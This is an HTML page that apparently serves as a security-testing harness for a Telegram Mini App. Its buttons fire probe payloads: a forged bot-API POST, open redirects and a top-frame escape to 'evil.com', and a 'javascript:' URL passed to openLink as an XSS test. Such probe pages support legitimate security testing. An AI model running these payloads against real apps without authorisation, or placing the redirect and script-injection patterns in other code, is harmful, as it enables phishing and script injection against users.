<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mini App Security Test</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <h2>ğŸš€ Telegram Mini App Security Testing</h2>

    <button onclick="testCSRF()">Test CSRF</button>
    <button onclick="testOpenRedirect()">Test Open Redirect</button>
    <button onclick="testIframeEscape()">Test Iframe Escape</button>
    <button onclick="testXSS()">Test XSS via openLink()</button>

    <script>
        // âœ… CSRF Test (Check if Telegram API blocks unauthorized requests)
        function testCSRF() {
            fetch("https://api.telegram.org/bot<TOKEN>/sendMessage", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: "<CHAT_ID>",
                    text: "CSRF Test Message"
                })
            })
            .then(response => response.text())
            .then(data => console.log("âœ… CSRF Test Result:", data))
            .catch(error => console.error("âŒ CSRF Attack Failed:", error));
        }

        // âœ… Open Redirect Test (Check if Telegram blocks phishing attempts)
        function testOpenRedirect() {
            Telegram.WebApp.openLink("https://evil.com");
        }

        // âœ… Iframe Escape Test (Check if we can break out of Telegram Web)
        function testIframeEscape() {
            try {
                top.location = "https://evil.com";
            } catch (error) {
                console.error("âŒ Iframe Escape Failed:", error);
            }
        }

        // âœ… XSS via openLink() Test (Check if Telegram sanitizes input)
        function testXSS() {
            Telegram.WebApp.openLink("javascript:alert('XSS Detected!')");
        }

        // âœ… Log received messages for origin spoofing tests
        window.addEventListener("message", (event) => {
            console.log("ğŸ“© Received Message:", event.origin, event.data);
        });

        // âœ… Check for potential origin bypass
        if (document.referrer !== "https://web.telegram.org") {
            alert("â—Possible Origin Bypass Detected!");
        }
    </script>
</body>
</html>
